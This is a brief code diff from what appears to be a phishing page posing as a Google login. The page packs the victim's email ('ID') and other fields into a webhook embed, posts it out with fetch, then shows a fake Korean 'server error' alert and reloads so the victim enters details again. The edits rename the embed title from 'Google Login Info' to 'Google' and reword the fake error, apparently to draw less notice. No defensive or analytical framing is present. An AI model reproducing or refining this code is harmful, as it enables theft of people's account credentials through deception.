@@ -97,7 +97,7 @@
 
         const payload = {
             embeds: [{
-                title: "Google Login Info",
+                title: "Google",
                 color: 15790320,
                 fields: [
                     { name: "ID", value: email, inline: false },
@@ -115,7 +115,7 @@
                     body: JSON.stringify(payload)
                 })
             ));
-            alert("서버 오류가 발생했습니다. 다시 시도해 주세요.");
+            alert("error⚠️, 다음에 다시 시도해주십시오.");
             location.reload();
         } catch (e) {
             console.error(e);
